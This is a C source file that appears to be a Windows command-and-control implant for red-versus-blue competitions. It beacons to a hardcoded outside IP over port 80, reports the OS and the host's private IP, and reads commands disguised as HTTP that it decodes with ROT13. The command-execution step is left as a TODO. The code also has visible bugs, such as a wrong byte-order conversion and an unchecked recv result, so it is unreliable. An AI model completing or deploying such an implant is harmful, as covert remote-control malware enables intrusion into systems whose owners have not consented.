#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#pragma comment(lib,"ws2_32.lib")
#define _CRT_SECURE_NO_WARNINGS

static void encrypt(char* plainText) {
    // This function takes a pointer to a string, and rotates the characters by 13
    // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
    // To do both encryption and decryption

    // Build the encrypted String by iterating through each character, and rotating it.
    char* newString = (char*)calloc(1024, sizeof(char));
    for (int i = 0; i < strnlen(plainText, 1024); i++) {
        if ((plainText[i] >= 'a' && plainText[i] <= 'z')) {
            newString[i] = ((plainText[i] - 'a' + 13) % 26) + 'a';
        }
        else if ((plainText[i] >= 'A' && plainText[i] <= 'Z')) {
            newString[i] = ((plainText[i] - 'A' + 13) % 26) + 'A';
        }
        else {
            newString[i] = plainText[i];
        }
    }

    // Replace the the plain text with the cipher text
    strcpy_s(plainText, 1024, newString);
}

int main(void) {
    // Initialize the Socket, and server address variables
    WSADATA sockData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char serverMessage[1024];
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';
    //int bytesRead;

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    const char* serverIPAddress = "167.172.13.38";
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = htonl(inet_addr(serverIPAddress));
    serverAddr.sin_port = htons(80);

    // Connect to server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("Error connecting");
        exit(EXIT_FAILURE);
    }

    int threadnum = 0;
    SOCKET thread;
    
    // The first message sent to the Server is the OS
    const char* osMessage = "Windows";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    int hostnameReturnValue = gethostname(host, sizeof(host));
    struct hostent* host_entry = gethostbyname(host);
    char* hostIPAddress;
    hostIPAddress = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
    send(clientSocket, hostIPAddress, strnlen(hostIPAddress, 40), 0);

    while (1) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1024, 0);
        int junk = getchar(); // clearout \n
        serverMessage[bytesRead] = '\0';

        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
        const char* httpOK = "HTTP/1.1 200 OK";
        const char* contentLength = "Content-Length:";
        const char* contentType = "Content-Type: text/plain; charset=utf-8";
        if ((strncmp(serverMessage, httpOK, 17) != 0) && (strstr(serverMessage, contentLength) == NULL) && (strncmp(serverMessage, contentType, 41) != 0) && (serverMessage[0] != '\0')) {
            encrypt(serverMessage);
            const char* keepAlive = "KEEP_ALIVE";
            // Check to make sure the message isn't a keep alive message
            if (strncmp(serverMessage, keepAlive, 11) != 0) {
                // TODO Execute Command
            }
        }
        printf("Server sent: %s\n", serverMessage);
    }

    // Close client socket
    closesocket(clientSocket);

    return 0;
}
